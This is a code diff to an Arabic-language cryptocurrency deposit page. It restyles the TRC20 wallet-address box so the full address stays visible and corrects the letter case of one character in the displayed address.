@@ -102,25 +102,27 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 
 .manual-deposit-box { margin-top:25px; padding:15px; border:2px dashed #474d57; border-radius:8px; background-color: rgba(43, 49, 57, 0.6); text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.3); box-sizing:border-box; }
 
+/* هذا التعديل يمنع إخفاء النص ويجبر المحفظة على النزول لسطرين كاملين بشكل واضح */
 .crypto-address-container { 
     font-family:'Changa',sans-serif !important; 
     width: 100%; 
-    padding: 12px 8px; 
+    padding: 14px 10px; 
     text-align: center; 
     background: #181a20; 
     color: #ffffff !important; 
     border: 1px solid #474d57; 
     border-radius: 6px; 
-    font-size: 12px; 
+    font-size: 15px; 
     font-weight: 700; 
     direction: ltr; 
     box-sizing: border-box; 
     margin-top: 5px; 
-    margin-bottom: 10px;
+    margin-bottom: 15px;
     letter-spacing: 0.5px;
     white-space: normal !important; 
     word-break: break-all !important; 
     overflow: visible !important;
+    line-height: 1.4;
 }
 
 .check-account-btn { font-family:'Changa',sans-serif !important; width:100%; padding:12px; background:transparent; color:#848e9c; border:1px dashed #474d57; border-radius:8px; font-weight:600; font-size:14px; margin-top:15px; margin-bottom:5px; cursor:pointer; transition:0.3s; box-sizing:border-box; display:block; }
@@ -226,7 +228,8 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 
 <div class="manual-deposit-box">
 <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
+<!-- تم تصحيح المحفظة الرسمية لتصبح 3KVEDFP بالأحرف الكبيرة وتعديل الصندوق لتفادي القطع -->
+<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3KVEDFP</div>
 <button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ العنوان المعروض</button>
 </div>
 </div>
